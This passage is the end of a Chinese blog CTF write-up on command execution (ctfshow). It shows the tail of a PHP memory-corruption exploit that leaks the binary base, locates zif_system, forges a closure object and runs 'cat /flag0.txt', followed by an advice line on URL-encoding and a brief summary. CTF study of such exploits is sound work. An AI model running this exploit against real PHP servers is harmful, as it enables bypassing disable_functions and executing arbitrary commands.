+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$closure_obj</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$closure_handlers</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$base</span> <span class="o">=</span> <span class="nx">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t determine binary base address&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$elf</span> <span class="o">=</span> <span class="nx">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t parse ELF header&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nx">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get basic_functions address&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$zif_system</span> <span class="o">=</span> <span class="nx">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get zif_system address&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$fake_obj_offset</span> <span class="o">=</span> <span class="mh">0xd0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x110</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="nv">$fake_obj_offset</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">,</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$closure_obj</span><span class="p">,</span> <span class="nv">$i</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_obj_offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">)(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nx">ctfshow</span><span class="p">(</span><span class="s2">&#34;cat /flag0.txt&#34;</span><span class="p">);</span><span class="nx">ob_end_flush</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#需要通过url编码哦
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>发包后记得url编码一下</p>
+<h1 id="四小结">四、小结
+</h1><p>​    命令执行到这就差不多了，特殊手法虽然没有完全归纳，不过大致的解题思路和绕过手法都有提到，希望大家能从中学到东西。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 liernian
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
